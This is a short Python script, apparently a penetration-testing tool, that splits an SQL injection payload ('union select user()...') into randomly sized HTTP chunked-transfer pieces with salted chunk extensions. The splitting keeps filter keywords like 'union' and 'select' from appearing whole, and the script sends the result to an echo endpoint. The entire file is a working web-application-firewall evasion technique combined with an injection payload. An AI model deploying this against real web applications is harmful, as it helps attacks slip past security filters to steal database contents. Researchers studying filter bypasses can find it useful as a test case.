#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/3/9 10:21 PM
# @Author  : w8ay
# @File    : auto_build_chunked.py

# 根据payload内容自动生成分块，自动分割关键字
# chunk_size控制到1-9之内,遇到关键词自动切割
import string

import HackRequests
import random


def chunk_data(data, keywords: list):
    dl = len(data)
    ret = ""
    index = 0
    while index < dl:
        chunk_size = random.randint(1, 9)
        if index + chunk_size >= dl:
            chunk_size = dl - index
        salt = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        while 1:
            tmp_chunk = data[index:index + chunk_size]
            tmp_bool = True
            for k in keywords:
                if k in tmp_chunk:
                    chunk_size -= 1
                    tmp_bool = False
                    break
            if tmp_bool:
                break
        index += chunk_size
        ret += "{0};{1}\r\n".format(hex(chunk_size)[2:], salt)
        ret += "{0}\r\n".format(tmp_chunk)

    ret += "0\r\n\r\n"
    return ret


payload = "id=-1' and union select user(),2,3,4,5 from table"
keywords = ['and', 'union', 'select', 'user', 'from']
data = chunk_data(payload, keywords)

raw = '''
POST /post HTTP/1.1
Host: httpbin.org
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Transfer-Encoding: Chunked

{}

'''.format(data)
hack = HackRequests.hackRequests()

r = hack.httpraw(raw)
print(raw)

print(r.text())
print(r.log)
